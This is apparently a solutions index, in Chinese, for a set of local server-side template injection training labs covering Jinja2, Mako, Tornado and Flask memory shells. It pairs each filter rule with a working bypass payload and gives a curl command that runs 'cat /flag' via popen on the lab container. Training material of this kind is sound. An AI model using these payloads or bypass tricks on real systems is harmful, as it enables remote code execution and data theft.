# 题解索引（Solutions Index）

> 这是**索引与速查**，不是完整题解。每个靶场的完整题解（关卡表、逐关 payload、
> 已实测输出）都在它自己的 `README.md` 里，容器内也以 `/docs/README.md` 提供。
>
> 本文只做两件事：**① 指路**；**② 给出「哪条 payload 破哪条规则」的横向速查**。
>
> 可信度：标 ✅ 的 payload 在本文档对应镜像上经 `POST /api/render`（`mode=god`）
> 实际执行过；标「未验证」的是方向而非结论。
> 详细验证记录见各靶场 README 与 `scripts/verify_labs.py`。

---

## 1. 靶场 → 题解

| 靶场 | 题解 | 一句话 |
|------|------|--------|
| 01-jinja-waf-fenjing | [`labs/01-jinja-waf-fenjing/README.md`](../labs/01-jinja-waf-fenjing/README.md) | 关键词表 WAF；Fenjing 工具路线 + `~` 拼接手搓路线，均 ✅ |
| 02-jinja-chain | [`labs/02-jinja-chain/README.md`](../labs/02-jinja-chain/README.md) | Jinja2 13 关链；**id 0–10 已实测可解**，id 11/12 未找到解（见 [`SOLVABILITY.md`](SOLVABILITY.md)） |
| 03-mako-chain | [`labs/03-mako-chain/README.md`](../labs/03-mako-chain/README.md) | Mako 13 关；id 0–10 已实测，id 10/11/12 为硬关（仅确认语法面） |
| 04-tornado-chain | [`labs/04-tornado-chain/README.md`](../labs/04-tornado-chain/README.md) | Tornado 13 关；id 0、3–9 已实测，id 1/10/11/12 无短解 |
| 05-jinja-sandbox | （**待补**：只有脚手架，没有 `app.py`） | 沙箱逃逸，渲染器已就绪 |
| 06-blind-ssti | （**待补**：只有脚手架，没有 `app.py`） | 盲注与侧信道 |
| 07-flask-memshell | [`labs/07-flask-memshell/README.md`](../labs/07-flask-memshell/README.md) | 不出网 Flask 内存马；5 个台阶，路由型 + Filter 型均 ✅ |
| 08-freemarker-memshell | [`labs/08-freemarker-memshell/README.md`](../labs/08-freemarker-memshell/README.md)（由另一位作者维护） | 不出网 Java/Tomcat 内存马；Java payload 细节以该 README 为准 |
| —— 原理 —— | [`KNOWLEDGE.md`](KNOWLEDGE.md) | 引擎指纹、通用利用模型、gadget 目录、盲注、沙箱、不出网 |
| —— 内存马 —— | [`MEMSHELL.md`](MEMSHELL.md) | 内存马原理 + 两个已验证 payload 的逐行解释 |

---

## 2. 横向速查：哪条 payload 破哪条规则

### 2.1 定界符类规则

| 规则 | 被拦的载荷 | 破解 payload | 验证 |
|------|-----------|--------------|------|
| Jinja/Tornado 禁 `{{` | `{{7*7}}` | `{% print(7*7) %}` / `{% if True %}x{% end %}` | ✅ lab 02 id1、lab 04 id1 |
| Tornado 禁 `{{` 且要**回显** | `{{ open('/flag').read() }}` | —— 语句块能执行但无回显通道 | ⚠️ lab 04 id1 无已验证解 |
| Mako 禁 `${` | `${7*7}` | `<% context.write(7*7) %>`、`<%context.write(open('/flag').read())%>` | ✅ lab 03 id1 |
| Mako 禁 `${` + 组合过滤（id10） | 上述两者 | —— `<% %>` 里仍有引号/加号限制 | ⚠️ 未验证 |

### 2.2 字符黑名单类规则

| 被禁字符 | 语义受损 | 替代语法 | 验证 |
|----------|----------|----------|------|
| `[` `]` | 下标 / 切片 | 直接读全文；Jinja 用 `\|first` / `\|list`；Tornado/Mako 用 `list()` | ✅ lab 03 id3、lab 04 id3 |
| `'` `"` | 字符串字面量 | `chr(47)+chr(102)+...`（Mako/Tornado）；`request.args.x`（Jinja） | ✅ lab 03 id4、lab 04 id4 |
| `_` | 魔术属性名 | 不用带下划线的链：`open(chr(...)).read()`、`{% import subprocess %}` | ✅ lab 03 id5、lab 04 id5 |
| `.` | 属性访问语法糖 | `getattr(obj,'name')`（Mako/Tornado）；`\|attr`（Jinja）；`[]`（Jinja） | ✅ lab 03 id6、lab 04 id6 |
| `+` | 字符串/整数拼接 | `\|join`（Jinja）、`''.join()`、相邻字面量隐式拼接 | 部分验证（lab 01 隐式拼接 ✅） |
| `0-9` | 数字字面量 | `True` / `len('')` / `bytes()`；或换一条不含数字的链 | ✅ lab 03 id8、lab 04 id8 |
| `\` | 转义 | 通常不需要 | — |

### 2.3 子串黑名单类规则（12 词表）

lab 02/03/04 的 L8 与 L13 共用同一张表：
`class` `arg` `form` `value` `data` `request` `init` `global` `open` `mro` `base` `attr`
（L13 另加 `config` `app` `self`）。

| 被拦的写法 | 为什么被拦 | 绕过写法 | 验证 |
|-----------|-----------|----------|------|
| `open(...)` | 子串 `open` | Mako/Tornado 改 `__import__('subprocess').getoutput(...)`；Jinja 走 `__builtins__['op'~'en']` | ✅ lab 01、lab 03 id7、lab 04 id7 |
| `getattr(...)` | 子串 `attr` | Jinja `\|attr('get')('o'~'s')`；`obj['name']` | ✅ lab 01 |
| `handler.get_argument` | 子串 `arg` | 改用 `{{ handler }}` 其他的成员，或 `{% import %}` | ✅ lab 04 id7（实测 WAF） |
| `request` | 子串 `request` | 用 `session` / `config` / `g` / `url_for` 等其它上下文通道 | ✅ lab 03 id10、lab 04 id10 |
| `__globals__` | 子串 `global` | 拼字符串：`'_'~'_'~'globals'~'_'~'_'` | ✅ lab 01 |
| `__class__` | 子串 `__`（或 `class`） | `'_'~'_'~'class'~'_'~'_'` | ✅ lab 01（WAF 边界）、lab 02 思路 |
| `__init__` | 子串 `init` / `__` | 同上拼接；或换 `escape` / `lipsum` 这类不用 `__init__` 的起点 | ✅ lab 04 id12 |
| `subprocess.check_output` | 子串 `_`（L12 起） | 换 `getoutput`（无下划线） | ✅ lab 04 id7 |
| `cat` / `flag`（lab 01 专有） | 各是一个词 | `'ca'~'t'`、`'/fla'~'g'`、`'galf/ tac'[::-1]` | ✅ lab 01 |

### 2.4 前缀拼接 / 变量置空类规则

| 规则 | 观测量 | 绕过 | 验证 |
|------|--------|------|------|
| `{% set config=None%}{% set self=None%}`（Jinja/Tornado） | `template_after_waf` 里能看到前缀 | 换入口：`lipsum` / `cycler` / `escape` / `datetime` | ✅ lab 02 id9、lab 04 id9 |
| `% if False:\n% endif\n`（Mako） | 同上 | 前缀是合法行语法，照常写载荷 | ✅ lab 03 id9 |

### 2.5 回显方式（不是「规则」，但决定打法）

| `echo_mode` | 你看到的 | 打法 | 验证 |
|-------------|----------|------|------|
| `full` | 渲染结果 | 直接读 | ✅ 多数关卡 |
| `bool` | `correct` / `wrong` | 布尔盲注：让条件决定是否抛异常 | ✅ lab 02/03/04 id2 |
| `none` | 恒定字符串 | 副作用：写文件 / 注册路由 / 改进程状态 | ✅ lab 07 step2 |
| `file` | 恒定字符串 | 写进可访问目录再 HTTP 取回 | ✅ lab 07 step3（`/echo/`） |

---

## 3. 按知识点找关卡

| 想练什么 | 去哪 |
|----------|------|
| 工具型绕过（不可枚举黑名单） | lab 01（Fenjing `crack-keywords`） |
| 定界符被封后换语法面 | lab 02 id1、lab 03 id1、lab 04 id1、lab 07 step1 |
| 字符串构造（`~` / `chr` / 反转切片） | lab 01、lab 02 id7–id8、lab 03 id4–id8、lab 04 id4–id7 |
| 属性访问的四种等价写法 | lab 02 id5–id7、lab 03 id6、lab 04 id6、[`KNOWLEDGE.md` §4.5](KNOWLEDGE.md) |
| 对象图 → `os` / `__builtins__` | lab 01、lab 02 id0–id7、lab 04 id7、lab 07 step0 |
| 前缀污染 / 变量置空 | lab 02 id9、lab 03 id9、lab 04 id9 |
| 布尔盲注 | lab 02/03/04 id2 |
| 完全无回显（连成败都不给） | lab 07 step2 |
| 无回显 + 不出网 → 文件回显 | lab 07 step3 |
| 无回显 + 不出网 → 内存马 | lab 07 step4（Flask）、lab 08（Tomcat） |
| 沙箱逃逸 | lab 05（**待实现**）；原理见 [`KNOWLEDGE.md` §7](KNOWLEDGE.md) |
| 引擎指纹 | 各靶场 L1；[`KNOWLEDGE.md` §2](KNOWLEDGE.md) |

---

## 4. 公开硬关清单（当前无短解）

> 📊 **完整的「每关都有解吗」实测矩阵、成因分析与三种处理方案，
> 见 [`SOLVABILITY.md`](SOLVABILITY.md)。** 那一份是用
> `tests/audit_solvability.py` 逐关实打出来的，本节只是摘要。

这些关卡当前**没有已验证的短解**。请注意区分两类情况：

- **属于设计缺陷的一类**：`04-tornado-chain` id 1。Tornado 模板**只有 `{{ }}` 一种输出
  构造**，拦掉它等于拿掉回显通道 —— 选手再能执行也带不出结果。**建议改掉这一关的过滤
  目标**（见 `SOLVABILITY.md` 2.1 的三种改法）。
- **属于难度上限的一类**：其余 8 关是把「造字符串所需通道」层层收紧的结果，
  是刻意设计，但作为出题方不应把「可能有解」当成「有解」交付。

若要让它们「必有短解」，需要放宽对应的 `WafSpec`：

| 靶场 | 关卡 | 现有过滤 | 已知可用面 |
|------|------|----------|-----------|
| 02-jinja-chain | id 11 | `' " + . [ ]` + `request` | ✅ **已找到解**：`dict(kw=1)\|first` 造串 + `chr()` 拼命令，见 `SOLVABILITY.md` 2.2 |
| 02-jinja-chain | id 12 | 再加 `_` 与数字、`\` | 无下划线 ⇒ 写不出 `__globals__`；无数字 ⇒ `chr(95)` 也造不出下划线 |
| 02-jinja-chain | id 13 | 符号 + `request/class/init/arg/config/app/self` | 连 `+`（拼接）都没有 |
| 03-mako-chain | id 10 | `' " + . [ ]` + `request` | `chr` 内置名、函数调用、模块块；但 `getattr` 需要 str 名字，而造 str 需要 `+`/`'`/`.`（全被禁） |
| 03-mako-chain | id 11 | 再加 `_` 与数字、`\` | `<%! %>` 模块块（`<%!import os%>` 实测不报错） |
| 03-mako-chain | id 12 | 符号 + `request/class/init/arg/config/app/self` | **`<%!import os%>${os}` 实测通过** ✅（但取不出 flag） |
| 04-tornado-chain | id 1 | 子串 `{{` | ⚠️ 语句块可执行但**无回显通道** ⇒ 设计缺陷 |
| 04-tornado-chain | id 10 | `' " + . [ ]` + `request` | `escape` / `handler` 起点仍在 |
| 04-tornado-chain | id 11 | 再加 `_` 与数字、`\` | `{% import %}` 语句本身可通过 |
| 04-tornado-chain | id 12 | 符号 + 扩展关键字 | `{{7*7}}`、`{{True}}`、`{{escape}}`、`{% import subprocess %}` 均可用 |

改动过滤后请同步改：`shared/ssti_core/levels/<engine>.py`、该靶场 `README.md` 的关卡表、
`scripts/verify_labs.py` 的探针，并重跑 `tests/audit_solvability.py` 确认新的矩阵。

---

## 5. 复现一条 payload 的最短命令

```bash
# 1) 起靶场（先建前端镜像）
scripts/build-frontend.sh
cd labs/02-jinja-chain && docker compose up --build -d

# 2) god 模式下打一发
curl -s -X POST localhost:8092/api/render \
  -H 'Content-Type: application/json' \
  -d '{"level":"0","mode":"god","template":"{{lipsum.__globals__.os.popen(\"cat /flag\").read()}}"}' | jq
```

载荷里引号多、含 `$`、含 `%` 时，**写进 JSON 文件再 `--data-binary @payload.json`**
可以彻底躲开 shell 转义问题：

```json
{"level":"0","mode":"god","template":"{{lipsum['_'~'_'~'globals'~'_'~'_']['o'~'s']['pop'~'en']('ca'~'t'~' '~'/fla'~'g')['read']()}}"}
```

一键回归：`python scripts/verify_labs.py`（起临时容器，逐靶场断言）。
